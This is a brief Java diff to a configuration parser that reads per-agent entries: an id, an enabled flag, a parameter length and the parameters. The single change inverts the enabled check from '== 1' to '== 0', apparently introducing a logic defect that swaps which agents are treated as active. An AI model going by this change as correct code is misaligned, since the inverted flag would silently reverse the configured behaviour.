@@ -221,7 +221,7 @@ public class Configuration {
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < agentNum; i++) {
 			final int id = wrappedClearConf.getInt();
-			final boolean enabled = wrappedClearConf.getInt() == 1;
+			final boolean enabled = wrappedClearConf.getInt() == 0;
 			final int plen = wrappedClearConf.getInt();
 
 			final byte[] params = new byte[plen];
